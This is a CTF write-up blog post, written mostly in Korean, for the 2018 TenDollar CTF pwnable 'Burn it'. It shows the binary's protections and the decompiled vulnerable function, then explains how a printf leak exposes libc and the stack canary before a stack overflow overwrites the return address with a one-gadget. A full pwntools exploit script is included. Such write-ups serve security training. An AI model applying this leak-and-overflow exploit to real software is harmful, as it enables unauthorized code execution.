---
title: "2018 TenDollar CTF Burn it"
date: 2020-2-17
ctf: TenDollar CTF
layout: post
published : false
---

좀 재밌게 풀었다 뭐 문제에 기능은 많은데 한 함수에서 모든걸 다 해결해버릴 수 있다.

```
[*] '/vagrant/ctfs/2018_TDCTF/pwnable/burnit/burnit'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

여기 함수에서 취약점이 터져부린다.

```c
unsigned __int64 sub_C4F()
{
  char v1; // [rsp+7h] [rbp-159h]
  __int64 v2; // [rsp+8h] [rbp-158h]
  char v3; // [rsp+10h] [rbp-150h]
  unsigned __int64 v4; // [rsp+158h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  while ( 1 )
  {
    puts("Do you have anything to say to the professor?[y/n]");
    _isoc99_scanf("%s", &v1);
    getchar();
    if ( v1 != 'y' )
      break;
    sub_C00(v2, &v3);
    printf("right? %s\n", &v3);
  }
  puts("Good bye~");
  return __readfsqword(0x28u) ^ v4;
}
```

printf로 v3출력해주니까 값을 채워서 원하는 값 leak할 수있는데 중간에 stdin이 있어서 libc도 구할 수 있었다. 그리고 카나리도 구했고 페이로드 맞춰서 리턴을 원샷으로 잘 덮어주면 된다

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./burnit')
p = process('./burnit',aslr=True)
libc = e.libc
s = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

sla(':','4')
sla('[y/n]','y')
sl('B'*72)
p.recvuntil('B'*72)
stdin = u64(p.recv(6)+'\x00\x00')
log.info('_IO_2_1_stdin_ : {}'.format(hex(stdin)))
libc_base = stdin - libc.symbols['_IO_2_1_stdin_']
log.info('libc_base : {}'.format(hex(libc_base)))

sla('[y/n]','y')
sl('B'*328+'C')
p.recvuntil('C')
canary = u64('\x00'+p.recv(7))
log.info('Canary : {}'.format(hex(canary)))

sla('[y/n]','y')
sl('B'*328+p64(canary)+'A'*8+p64(libc_base+0x45216))

sla('[y/n]','n')

p.interactive()
```

